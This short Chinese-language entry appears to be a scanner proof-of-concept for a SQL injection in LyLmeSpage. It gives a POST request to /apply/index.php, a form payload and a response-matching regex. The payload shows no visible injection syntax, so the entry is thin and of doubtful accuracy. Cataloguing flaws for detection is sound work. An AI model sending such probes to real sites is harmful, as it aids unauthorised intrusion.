# LyLmeSpageSQL注入漏洞

LyLmeSpageSQL ｜ SQL注入 ｜ —
- **请求**：`POST /apply/index.php?submit=post HTTP/1.1`

**Payload**
```
url=http://98djaodxslgO1pVZyH3FPL3vkkBH.com&name=test&group_id=1&icon=&authcode=
```
- **响应特征**：200 ^(?=.*?code)(?=.*?200).*?$